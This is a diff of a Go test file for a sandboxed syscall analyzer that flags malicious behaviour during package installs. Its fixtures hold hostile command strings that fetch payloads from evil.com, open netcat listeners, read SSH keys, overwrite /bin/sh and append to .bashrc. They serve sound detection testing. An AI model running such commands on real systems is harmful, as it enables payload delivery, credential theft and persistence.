@@ -84,18 +84,56 @@ func TestAnalyze_FiltersBenignExec(t *testing.T) {
 	}
 }
 
-func TestAnalyze_SuspiciousExec(t *testing.T) {
-	events := []types.SyscallEvent{
+// TestAnalyze_CurlMultiLayerDefense documents the multi-layer defense
+// model for network tools like curl during install:
+//
+//   - Layer 1 (containment): the sandbox enforces --network=none, so
+//     curl cannot actually reach the destination.
+//   - Layer 2 (harm-firing detection): the connect() syscall fires
+//     regardless of network availability and is classified as
+//     c2_communication (HIGH).
+//   - Layer 3 (forensic chain): the curl execve itself is still
+//     recorded as CategoryUnknownBinary (LOW) so the analyst sees the
+//     full process tree, but it does not flip the verdict on its own
+//     (avoids classifying every binary kojuto doesn't recognize as
+//     malicious — see classifyExecve rationale).
+//
+// Realistic malicious curl always triggers a connect() and so trips
+// Layer 2. Curl invoked in isolation (without any network call) is
+// not malicious and correctly stays clean.
+func TestAnalyze_CurlMultiLayerDefense(t *testing.T) {
+	// Curl execve in isolation: no harm-firing syscall captured.
+	// Recorded for forensic visibility, but verdict stays clean.
+	curlAlone := []types.SyscallEvent{
+		{Syscall: types.EventExecve, Comm: "/usr/bin/curl", Cmdline: "curl --version"},
+	}
+	verdict, filtered := Analyze(curlAlone)
+	if verdict != types.VerdictClean {
+		t.Errorf("expected clean for execve-only (Layer 3 forensic record), got %s", verdict)
+	}
+	if len(filtered) != 1 || filtered[0].Category != types.CategoryUnknownBinary {
+		t.Errorf("expected single CategoryUnknownBinary event, got %v", filtered)
+	}
+
+	// Realistic malicious curl: execve + connect. Layer 2
+	// (c2_communication on the connect) flips the verdict.
+	curlWithConnect := []types.SyscallEvent{
 		{Syscall: types.EventExecve, Comm: "/usr/bin/curl", Cmdline: "curl http://evil.com/payload"},
+		{Syscall: types.EventConnect, DstAddr: "203.0.113.42", DstPort: 443, Family: 2},
 	}
-
-	verdict, filtered := Analyze(events)
+	verdict, filtered = Analyze(curlWithConnect)
 	if verdict != types.VerdictSuspicious {
-		t.Errorf("expected suspicious for curl, got %s", verdict)
+		t.Errorf("expected suspicious when connect fires (Layer 2), got %s", verdict)
 	}
-
-	if len(filtered) != 1 {
-		t.Errorf("expected 1 suspicious event, got %d", len(filtered))
+	var sawC2 bool
+	for _, e := range filtered {
+		if e.Category == types.CategoryC2 {
+			sawC2 = true
+			break
+		}
+	}
+	if !sawC2 {
+		t.Errorf("expected a c2_communication event in %v", filtered)
 	}
 }
 
@@ -125,93 +163,147 @@ func TestAnalyze_ShellCBenign(t *testing.T) {
 	}
 }
 
-func TestAnalyze_ShellCSuspicious(t *testing.T) {
-	// Attack vectors that abuse sh -c to execute arbitrary code.
+// TestAnalyze_ShellCMultiLayer documents that sh -c attack patterns are
+// caught by the downstream harm-firing rule that observes the actual
+// side-effect syscall, not by the sh -c execve event alone. The
+// execve cmdline is recorded for forensic chain visibility
+// (CategoryUnknownBinary, LOW) but does not flip the verdict on its
+// own — see the classifyExecve design rationale.
+//
+// Each case below pairs the sh -c trigger with the harm syscall that
+// a real package would emit. The verdict comes from the harm rule.
+//
+// Cases without a follow-up harm event (sh -c standalone, no actual
+// network/file/exec activity) stay clean by design — there is no
+// harm to detect. Static analyzers (GuardDog and similar) handle the
+// pre-firing intent inspection at the source-code layer.
+func TestAnalyze_ShellCMultiLayer(t *testing.T) {
+	orig := sensitivePathPatterns
+	defer func() { sensitivePathPatterns = orig }()
+	SetSensitivePaths([]string{"/.ssh/", "/.aws/"})
+
 	cases := []struct {
-		name string
-		evt  types.SyscallEvent
+		name        string
+		events      []types.SyscallEvent
+		wantHighCat string // the rule that should fire HIGH
 	}{
 		{
-			name: "sh -c runs /tmp binary",
-			evt:  types.SyscallEvent{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c /tmp/malware"},
+			name: "sh -c then /tmp execve (fileless attack)",
+			events: []types.SyscallEvent{
+				{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c /tmp/malware"},
+				{Syscall: types.EventExecve, Comm: "/tmp/malware", Cmdline: "/tmp/malware"},
+			},
+			wantHighCat: types.CategoryCodeExecution, // L546 suspiciousExecDirs
 		},
 		{
-			name: "sh -c runs unknown binary",
-			evt:  types.SyscallEvent{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c /usr/local/sbin/backdoor --exfil"},
+			name: "sh -c curl then connect (c2)",
+			events: []types.SyscallEvent{
+				{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c curl http://evil.com/payload"},
+				{Syscall: types.EventExecve, Comm: "/usr/bin/curl", Cmdline: "curl http://evil.com/payload"},
+				{Syscall: types.EventConnect, DstAddr: "203.0.113.5", DstPort: 80, Family: 2},
+			},
+			wantHighCat: types.CategoryC2,
 		},
 		{
-			name: "sh -c runs wget",
-			evt:  types.SyscallEvent{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c wget http://evil.com -O /tmp/x"},
+			name: "sh -c wget then connect (c2)",
+			events: []types.SyscallEvent{
+				{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c wget http://evil.com -O /tmp/x"},
+				{Syscall: types.EventConnect, DstAddr: "203.0.113.10", DstPort: 80, Family: 2},
+			},
+			wantHighCat: types.CategoryC2,
 		},
 		{
-			name: "sh -c runs curl",
-			evt:  types.SyscallEvent{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c curl http://evil.com/payload"},
+			name: "sh -c nc then bind (backdoor)",
+			events: []types.SyscallEvent{
+				{Syscall: types.EventExecve, Comm: "/bin/dash", Cmdline: "dash -c nc -l 4444"},
+				{Syscall: types.EventBind, DstAddr: "0.0.0.0", DstPort: 4444, Family: 2},
+			},
+			wantHighCat: types.CategoryBackdoor,
 		},
 		{
-			name: "dash -c runs nc",
-			evt:  types.SyscallEvent{Syscall: types.EventExecve, Comm: "/bin/dash", Cmdline: "dash -c nc attacker.com 4444"},
+			name: "sh -c reads ssh key (credential access)",
+			events: []types.SyscallEvent{
+				{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c cat /home/dev/.ssh/id_rsa"},
+				{Syscall: types.EventOpenat, FilePath: "/home/dev/.ssh/id_rsa", OpenFlags: "O_RDONLY"},
+			},
+			wantHighCat: types.CategoryCredentialAccess,
 		},
 		{
-			name: "bash -c runs python",
-			evt:  types.SyscallEvent{Syscall: types.EventExecve, Comm: "/usr/bin/bash", Cmdline: "bash -c python3 -c 'import os; os.system(\"id\")'"},
-		},
-		// Command chain attacks: safe command followed by malicious command.
-		{
-			name: "semicolon chain: echo; curl",
-			evt:  types.SyscallEvent{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c echo x; curl http://evil.com"},
-		},
-		{
-			name: "pipe chain: echo | nc",
-			evt:  types.SyscallEvent{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c echo payload | nc attacker.com 4444"},
+			name: "sh -c cp overwrites system binary (binary hijack)",
+			events: []types.SyscallEvent{
+				{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c cp /tmp/payload /usr/local/bin/python3"},
+				{Syscall: types.EventOpenat, FilePath: "/usr/local/bin/python3", OpenFlags: "O_WRONLY|O_CREAT"},
+			},
+			wantHighCat: types.CategoryBinaryHijack,
 		},
 		{
-			name: "and chain: true && wget",
-			evt:  types.SyscallEvent{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c true && wget http://evil.com -O /tmp/x"},
+			name: "sh -c mv overwrites /bin/sh (binary hijack)",
+			events: []types.SyscallEvent{
+				{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c mv /tmp/backdoor /bin/sh"},
+				{Syscall: types.EventRename, SrcPath: "/tmp/backdoor", DstPath: "/bin/sh"},
+			},
+			wantHighCat: types.CategoryBinaryHijack,
 		},
 		{
-			name: "or chain: false || /tmp/malware",
-			evt:  types.SyscallEvent{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c false || /tmp/malware"},
-		},
-		// env abuse: env can run arbitrary commands.
-		{
-			name: "env runs curl",
-			evt:  types.SyscallEvent{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c env curl http://evil.com"},
-		},
-		// find -exec abuse.
-		{
-			name: "find -exec runs payload",
-			evt:  types.SyscallEvent{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c find /tmp -exec /tmp/payload {} ;"},
-		},
-		// Backtick command substitution.
-		{
-			name: "backtick substitution",
-			evt:  types.SyscallEvent{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c echo `curl evil.com`"},
-		},
-		// $() command substitution.
-		{
-			name: "dollar-paren substitution",
-			evt:  types.SyscallEvent{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c echo $(curl evil.com)"},
-		},
-		// File ops targeting trusted directories (binary hijack).
-		{
-			name: "cp payload to /usr/local/bin",
-			evt:  types.SyscallEvent{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c cp /tmp/payload /usr/local/bin/python3"},
-		},
-		{
-			name: "ln -s to /usr/bin",
-			evt:  types.SyscallEvent{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c ln -s /tmp/malware /usr/bin/node"},
-		},
-		{
-			name: "mv to /bin",
-			evt:  types.SyscallEvent{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c mv /tmp/backdoor /bin/sh"},
+			name: "sh -c writes .bashrc (persistence)",
+			events: []types.SyscallEvent{
+				{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c 'echo evil >> ~/.bashrc'"},
+				{Syscall: types.EventOpenat, FilePath: "/home/alice/.bashrc", OpenFlags: "O_WRONLY|O_APPEND"},
+			},
+			wantHighCat: types.CategoryPersistence,
 		},
 	}
 
 	for _, tc := range cases {
 		t.Run(tc.name, func(t *testing.T) {
-			verdict, _ := Analyze([]types.SyscallEvent{tc.evt})
+			verdict, filtered := Analyze(tc.events)
 			if verdict != types.VerdictSuspicious {
-				t.Errorf("expected suspicious, got %s for: %s", verdict, tc.evt.Cmdline)
+				t.Errorf("expected suspicious (harm-firing layer should catch), got %s", verdict)
+			}
+			var sawTarget bool
+			for _, e := range filtered {
+				if e.Category == tc.wantHighCat {
+					sawTarget = true
+					break
+				}
+			}
+			if !sawTarget {
+				cats := make([]string, 0, len(filtered))
+				for _, e := range filtered {
+					cats = append(cats, e.Category)
+				}
+				t.Errorf("expected category %q to fire, got categories %v", tc.wantHighCat, cats)
+			}
+		})
+	}
+}
+
+// TestAnalyze_ShellCStandaloneIsLow documents the inverse: a sh -c
+// event with NO follow-up harm syscall must NOT flip the verdict by
+// itself. This is the case that motivated the demotion — native-
+// module preinstall hooks like `sh -c "cross-env FOO=bar
+// node-gyp-build"` are legitimate and produce no harm syscalls when
+// the build is benign. Flagging them on cmdline content alone made
+// every clean npm package with native compilation register as
+// suspicious.
+func TestAnalyze_ShellCStandaloneIsLow(t *testing.T) {
+	cases := []string{
+		"sh -c cross-env ZERO_AR_DATE=1 node-gyp-build",
+		"sh -c node-gyp-build-test",
+		"sh -c prebuild-install || node-gyp rebuild",
+		"sh -c 'echo $(curl evil.com)'",       // no actual connect → clean
+		"sh -c 'find /tmp -exec /tmp/x {} ;'", // no actual /tmp execve → clean
+	}
+	for _, cmdline := range cases {
+		t.Run(cmdline, func(t *testing.T) {
+			verdict, filtered := Analyze([]types.SyscallEvent{
+				{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: cmdline},
+			})
+			if verdict != types.VerdictClean {
+				t.Errorf("expected clean for sh -c without follow-up harm syscall, got %s", verdict)
+			}
+			if len(filtered) != 1 || filtered[0].Category != types.CategoryUnknownBinary {
+				t.Errorf("expected single CategoryUnknownBinary event, got %v", filtered)
 			}
 		})
 	}
@@ -378,15 +470,58 @@ func TestShannonEntropy(t *testing.T) {
 	}
 }
 
-func TestAnalyze_SedExcluded(t *testing.T) {
-	// sed is excluded from benignPaths because GNU sed -e can execute shell commands.
-	events := []types.SyscallEvent{
-		{Syscall: types.EventExecve, Comm: "/usr/bin/sed", Cmdline: "sed -e 1e cat /etc/passwd"},
+// TestAnalyze_SedShellExecDefense documents that sed's shell-execution
+// abuse (e.g. `sed -e '1e cat /etc/passwd'`) is caught by the
+// harm-firing layer when sed actually spawns a shell, not by a
+// blanket sed-is-suspicious rule.
+//
+// sed in isolation is recorded as CategoryUnknownBinary (LOW) —
+// legitimate build scripts (autoconf, configure, make) invoke sed
+// constantly and we cannot blanket-flag sed without huge FP in source
+// builds. When sed's `e` command actually fires, the spawned `sh -c
+// <cmd>` is observed as a separate execve event and trips the
+// existing sh -c branch (HIGH), preserving detection.
+func TestAnalyze_SedShellExecDefense(t *testing.T) {
+	// sed alone is recorded for forensics but does not flip the
+	// verdict — there is no observable harm yet.
+	sedAlone := []types.SyscallEvent{
+		{Syscall: types.EventExecve, Comm: "/usr/bin/sed", Cmdline: "sed -e s/foo/bar/ input"},
+	}
+	verdict, filtered := Analyze(sedAlone)
+	if verdict != types.VerdictClean {
+		t.Errorf("expected clean for sed in isolation, got %s", verdict)
+	}
+	if len(filtered) != 1 || filtered[0].Category != types.CategoryUnknownBinary {
+		t.Errorf("expected single CategoryUnknownBinary event, got %v", filtered)
 	}
 
-	verdict, _ := Analyze(events)
+	// sed's `e` command actually fires a shell that reads a
+	// sensitive path. After the L563 demotion the verdict comes from
+	// the openat on the sensitive file (credential_access HIGH), not
+	// from cmdline inspection. sed and its child shell are recorded
+	// at LOW; the openat is the verdict driver.
+	orig := sensitivePathPatterns
+	defer func() { sensitivePathPatterns = orig }()
+	SetSensitivePaths([]string{"/.ssh/", "/.aws/"})
+
+	sedSpawnsShell := []types.SyscallEvent{
+		{Syscall: types.EventExecve, Comm: "/usr/bin/sed", Cmdline: "sed -e 1e cat /home/dev/.ssh/id_rsa input"},
+		{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c cat /home/dev/.ssh/id_rsa"},
+		{Syscall: types.EventOpenat, FilePath: "/home/dev/.ssh/id_rsa", OpenFlags: "O_RDONLY"},
+	}
+	verdict, filtered = Analyze(sedSpawnsShell)
 	if verdict != types.VerdictSuspicious {
-		t.Errorf("expected suspicious for sed, got %s", verdict)
+		t.Errorf("expected suspicious when sed-spawned shell reads .ssh, got %s", verdict)
+	}
+	var sawCred bool
+	for _, e := range filtered {
+		if e.Category == types.CategoryCredentialAccess {
+			sawCred = true
+			break
+		}
+	}
+	if !sawCred {
+		t.Errorf("expected credential_access from the openat, got %v", filtered)
 	}
 }
 
@@ -1014,27 +1149,238 @@ func TestArgsTouchSensitivePath(t *testing.T) {
 	}
 }
 
+// TestAnalyze_ShellCmdSensitivePath documents that `sh -c cat ~/.ssh/...`
+// is caught by the credential_access rule on the actual openat, not by
+// inspecting the shell cmdline. Without the harm syscall the shell
+// event records as CategoryUnknownBinary (LOW) for forensics.
+// Superseded by TestAnalyze_ShellCMultiLayer's "reads ssh key" case;
+// kept here as a focused regression against the demotion choice.
 func TestAnalyze_ShellCmdSensitivePath(t *testing.T) {
 	orig := sensitivePathPatterns
 	defer func() { sensitivePathPatterns = orig }()
 	SetSensitivePaths([]string{"/.ssh/", "/.aws/"})
 
 	events := []types.SyscallEvent{
-		{
-			Syscall: types.EventExecve,
-			Comm:    "/bin/sh",
-			Cmdline: "sh -c cat /home/dev/.ssh/id_rsa",
-		},
+		{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c cat /home/dev/.ssh/id_rsa"},
+		{Syscall: types.EventOpenat, FilePath: "/home/dev/.ssh/id_rsa", OpenFlags: "O_RDONLY"},
 	}
 	verdict, filtered := Analyze(events)
 	if verdict != types.VerdictSuspicious {
 		t.Errorf("expected suspicious for shell cmd accessing .ssh, got %s", verdict)
 	}
-	if len(filtered) != 1 {
-		t.Fatalf("expected 1 event, got %d", len(filtered))
+	var sawCred bool
+	for _, e := range filtered {
+		if e.Category == types.CategoryCredentialAccess {
+			sawCred = true
+			break
+		}
 	}
-	if filtered[0].Category != types.CategoryCodeExecution {
-		t.Errorf("expected category %q, got %q", types.CategoryCodeExecution, filtered[0].Category)
+	if !sawCred {
+		t.Errorf("expected credential_access from the openat, got %v", filtered)
+	}
+}
+
+// TestAnalyze_V8JITFilter documents the PID-based filter for V8 JIT
+// pages: simultaneous RWX mprotect/mmap from a Node interpreter is
+// legitimate code generation, not shellcode injection. The filter
+// requires (a) the same PID appears as the target of a prior execve,
+// (b) that execve's basename is a known JIT interpreter, and (c) the
+// execve came from a trusted system directory — an attacker cannot
+// bypass by planting a binary named "node" under /install/.
+func TestAnalyze_V8JITFilter(t *testing.T) {
+	// Node JIT pattern from /usr/bin/node. Must NOT flip the verdict.
+	nodePID := uint32(1234)
+	jitFromNode := []types.SyscallEvent{
+		{Syscall: types.EventExecve, Comm: "/usr/bin/node", Cmdline: "node /install/node_modules/lodash/index.js", PID: nodePID},
+		{Syscall: types.EventMprotect, MemProt: "PROT_READ|PROT_WRITE|PROT_EXEC", PID: nodePID},
+		{Syscall: types.EventMmap, MemProt: "PROT_READ|PROT_WRITE|PROT_EXEC", MemFlags: "MAP_PRIVATE|MAP_ANONYMOUS", PID: nodePID},
+	}
+	verdict, _ := Analyze(jitFromNode)
+	if verdict != types.VerdictClean {
+		t.Errorf("expected clean when RWX comes from /usr/bin/node, got %s", verdict)
+	}
+
+	// npm symlink (Linux binfmt_script transparently re-execs node;
+	// strace only sees the npm execve). The filter must treat npm
+	// from a trusted directory as JIT-equivalent.
+	npmPID := uint32(2345)
+	jitFromNpm := []types.SyscallEvent{
+		{Syscall: types.EventExecve, Comm: "/usr/local/bin/npm", Cmdline: "npm run --silent --if-present preinstall", PID: npmPID},
+		{Syscall: types.EventMprotect, MemProt: "PROT_READ|PROT_WRITE|PROT_EXEC", PID: npmPID},
+	}
+	verdict, _ = Analyze(jitFromNpm)
+	if verdict != types.VerdictClean {
+		t.Errorf("expected clean when RWX comes from /usr/local/bin/npm (V8 JIT via shebang), got %s", verdict)
+	}
+
+	// Shellcode injection pattern: RWX from a PID whose execve was NOT
+	// a JIT interpreter. Must STILL trip memory_execution.
+	payloadPID := uint32(5678)
+	shellcodeFromPayload := []types.SyscallEvent{
+		{Syscall: types.EventExecve, Comm: "/install/node_modules/evil/payload", Cmdline: "payload", PID: payloadPID},
+		{Syscall: types.EventMprotect, MemProt: "PROT_READ|PROT_WRITE|PROT_EXEC", PID: payloadPID},
+	}
+	verdict, filtered := Analyze(shellcodeFromPayload)
+	if verdict != types.VerdictSuspicious {
+		t.Errorf("expected suspicious when RWX from non-JIT PID, got %s", verdict)
+	}
+	var sawMemExec bool
+	for _, e := range filtered {
+		if e.Category == types.CategoryMemExec {
+			sawMemExec = true
+			break
+		}
+	}
+	if !sawMemExec {
+		t.Errorf("expected memory_execution event in %v", filtered)
+	}
+
+	// Bypass attempt: attacker plants a binary named "npm" or "node"
+	// under /install/ and exec's it. The basename matches
+	// jitInterpreters, but the directory is NOT in
+	// jitInterpreterTrustedDirs, so the filter MUST NOT suppress
+	// these events. Tests the path-constraint half of the filter.
+	for _, fakePath := range []string{
+		"/install/node_modules/evil/bin/npm",
+		"/install/node_modules/evil/bin/node",
+		"/tmp/node",
+	} {
+		bypassPID := uint32(9000)
+		bypassAttempt := []types.SyscallEvent{
+			{Syscall: types.EventExecve, Comm: fakePath, Cmdline: "fake-node", PID: bypassPID},
+			{Syscall: types.EventMprotect, MemProt: "PROT_READ|PROT_WRITE|PROT_EXEC", PID: bypassPID},
+		}
+		verdict, _ = Analyze(bypassAttempt)
+		if verdict != types.VerdictSuspicious {
+			t.Errorf("filter bypassed by %q — RWX from attacker-controlled path must NOT be filtered, got %s", fakePath, verdict)
+		}
+	}
+
+	// PID=0 (main strace target, parser miss) does NOT get the JIT
+	// pass — the existing shellcode detection still fires. This
+	// preserves the original behavior for events the parser failed
+	// to attribute.
+	rwxNoPID := []types.SyscallEvent{
+		{Syscall: types.EventMprotect, MemProt: "PROT_READ|PROT_WRITE|PROT_EXEC", PID: 0},
+	}
+	verdict, _ = Analyze(rwxNoPID)
+	if verdict != types.VerdictSuspicious {
+		t.Errorf("expected suspicious for unattributed RWX (PID=0), got %s", verdict)
+	}
+
+	// V8 worker thread pattern: node clones a thread that never
+	// execve's, then the thread does RWX mprotect for JIT pages.
+	// The clone event propagates the parent's comm to the child PID
+	// so the filter recognizes it. Without clone propagation, every
+	// real npm scan flips suspicious because V8 worker mprotect events
+	// leak past the filter.
+	parentNodePID := uint32(220)
+	workerPID := uint32(633)
+	jitFromWorkerThread := []types.SyscallEvent{
+		{Syscall: types.EventExecve, Comm: "/usr/bin/node", PID: parentNodePID},
+		{Syscall: types.EventClone, PID: parentNodePID, ChildPID: workerPID},
+		{Syscall: types.EventMprotect, MemProt: "PROT_READ|PROT_WRITE|PROT_EXEC", PID: workerPID},
+	}
+	verdict, _ = Analyze(jitFromWorkerThread)
+	if verdict != types.VerdictClean {
+		t.Errorf("expected clean when V8 worker thread (cloned from node) does RWX, got %s", verdict)
+	}
+
+	// Clone chain in temporal order: node → helper → grandchild → mprotect.
+	// Streaming pass resolves the grandchild's comm from helper's comm
+	// from node's comm. Mirrors strace's natural emission order.
+	helperPID := uint32(800)
+	grandchildPID := uint32(801)
+	jitFromGrandchild := []types.SyscallEvent{
+		{Syscall: types.EventExecve, Comm: "/usr/bin/node", PID: parentNodePID},
+		{Syscall: types.EventClone, PID: parentNodePID, ChildPID: helperPID},
+		{Syscall: types.EventClone, PID: helperPID, ChildPID: grandchildPID},
+		{Syscall: types.EventMprotect, MemProt: "PROT_READ|PROT_WRITE|PROT_EXEC", PID: grandchildPID},
+	}
+	verdict, _ = Analyze(jitFromGrandchild)
+	if verdict != types.VerdictClean {
+		t.Errorf("expected clean for clone-chain JIT (grandchild of node), got %s", verdict)
+	}
+
+	// PID = 0 main strace target: when strace runs `node` directly
+	// as its target (as in the import phase), node's syscalls have
+	// no `[pid X]` prefix and extract as PID = 0. Worker-thread
+	// clones from PID = 0 must propagate the main target's comm to
+	// the child. This is the case the original V8 filter missed and
+	// the reason every clean npm scan stayed suspicious before this
+	// streaming pre-pass.
+	workerFromMain := uint32(638)
+	jitFromMainTarget := []types.SyscallEvent{
+		{Syscall: types.EventExecve, Comm: "/usr/bin/node", PID: 0}, // strace target, no [pid X] prefix
+		{Syscall: types.EventClone, PID: 0, ChildPID: workerFromMain},
+		{Syscall: types.EventMprotect, MemProt: "PROT_READ|PROT_WRITE|PROT_EXEC", PID: workerFromMain},
+	}
+	verdict, _ = Analyze(jitFromMainTarget)
+	if verdict != types.VerdictClean {
+		t.Errorf("expected clean for V8 worker cloned from PID=0 main target, got %s", verdict)
+	}
+
+	// Main-target disambiguation: strace prints the main target's
+	// syscalls WITHOUT [pid X] prefix until ambiguity forces a
+	// switch. From that point the SAME process appears as [pid X]
+	// where X is its real kernel PID. This test simulates argon2's
+	// import phase where node's execve appears at PID=0 but later
+	// node thread-clones appear under PID=634 (node's real PID).
+	// Without main-target aliasing, clones from PID=634 cannot find
+	// a parent in m and worker mprotect events leak past the JIT
+	// filter. The aliasing pass propagates m[0] to m[634] when 634
+	// first emits a non-clone event.
+	nodeRealPID := uint32(634)
+	workerPID2 := uint32(636)
+	disambiguatedMainTarget := []types.SyscallEvent{
+		{Syscall: types.EventExecve, Comm: "/usr/bin/node", PID: 0},
+		{Syscall: types.EventMmap, MemProt: "PROT_NONE", PID: nodeRealPID}, // first event under disambiguated PID
+		{Syscall: types.EventClone, PID: nodeRealPID, ChildPID: workerPID2},
+		{Syscall: types.EventMprotect, MemProt: "PROT_READ|PROT_WRITE|PROT_EXEC", PID: workerPID2},
+	}
+	verdict, _ = Analyze(disambiguatedMainTarget)
+	if verdict != types.VerdictClean {
+		t.Errorf("expected clean for worker cloned from disambiguated main-target PID, got %s", verdict)
+	}
+
+	// A child that does its own execve overrides any clone-inherited
+	// comm. If sh forks a child and the child execs a malicious
+	// binary, the child's mprotect RWX must NOT be filtered as JIT.
+	maliciousPID := uint32(900)
+	childExecveWins := []types.SyscallEvent{
+		{Syscall: types.EventExecve, Comm: "/usr/bin/node", PID: parentNodePID},
+		{Syscall: types.EventClone, PID: parentNodePID, ChildPID: maliciousPID},
+		{Syscall: types.EventExecve, Comm: "/install/payload", PID: maliciousPID},
+		{Syscall: types.EventMprotect, MemProt: "PROT_READ|PROT_WRITE|PROT_EXEC", PID: maliciousPID},
+	}
+	verdict, _ = Analyze(childExecveWins)
+	if verdict != types.VerdictSuspicious {
+		t.Errorf("clone-then-execve must keep execve attribution, got %s — payload exec'd from clone'd child must still fire shellcode rule", verdict)
+	}
+}
+
+// Unrecognized binary execve (find, dirname, arbitrary tools) that
+// reaches the default branch of classifyExecve is recorded at LOW
+// severity (CategoryUnknownBinary) and must not flip the verdict on
+// its own. This documents the L570 default-branch demotion decided in
+// the classifyExecve rationale.
+func TestAnalyze_UnknownBinaryStaysClean(t *testing.T) {
+	events := []types.SyscallEvent{
+		{
+			Syscall: types.EventExecve,
+			Comm:    "/usr/bin/find",
+			Cmdline: "find /install/node_modules -name package.json",
+		},
+	}
+	verdict, filtered := Analyze(events)
+	if verdict != types.VerdictClean {
+		t.Errorf("expected clean for unknown binary (LOW-only events), got %s", verdict)
+	}
+	if len(filtered) != 1 {
+		t.Fatalf("expected 1 event recorded for forensic visibility, got %d", len(filtered))
+	}
+	if filtered[0].Category != types.CategoryUnknownBinary {
+		t.Errorf("expected category %q, got %q", types.CategoryUnknownBinary, filtered[0].Category)
 	}
 }
 
